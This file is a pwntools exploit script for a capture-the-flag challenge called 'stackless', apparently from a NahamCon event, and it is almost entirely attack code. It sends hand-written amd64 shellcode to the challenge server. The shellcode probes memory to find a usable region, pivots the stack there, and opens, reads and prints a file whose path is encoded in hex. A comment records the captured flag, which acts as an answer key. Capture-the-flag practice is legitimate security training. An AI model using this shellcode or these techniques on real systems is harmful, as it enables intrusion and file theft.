#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 32470 ./stackless
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./stackless')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 31582)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+649
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# 0x00555555550000
# 0x007ffffffde000
# 0x007ff55ffde000

write_asm = asm(f"""
start:
    movabs r10, 0x007ffc5c8d0000
    mov rbx, 0x0
    mov edi, 0x1
    mov dl, 0x10
main:
    mov r8, rbx
    sal r8, 12
    lea rsi, [r10+r8]
    mov eax, 0x1
    syscall
    cmp rax, 0x10
    je RET_SUCCESS
RET_FAIL:
    add rbx, 0x1
    jmp main
RET_SUCCESS:
    add rsi, 0x4200
    mov rsp, rsi
open:
    push 1
    dec byte ptr [rsp]
    mov rax, 0x7478742e67616c66
    push rax
    mov rax, 0x2f65676e656c6c61
    push rax
    mov rax, 0x68632f656d6f682f
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
read:
    mov rdi, rax
    xor edx, edx
    mov dl, 0xff
    mov rsi, rsp
    add rsi, 0x100
    xor eax, eax /* SYS_read */
    syscall
write:
    mov rdi, 0x1
    xor edx, edx
    mov dl, 0xff
    mov rsi, rsp
    add rsi, 0x100
    /* call write() */
    mov rax, 0x1
    syscall
    """)
p = b''
p += write_asm
io.sendlineafter(b"length\n",str(len(p)).encode())

io.sendlineafter(b"Shellcode\n",p)
# print (shellcraft.amd64.linux.egghunter(p64(0x00010102464c457f),0x00555555711000))

# print(shellcraft.egghunter())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
# flag{2e5016f202506a14de5e8d2c7285adfa}
io.interactive()

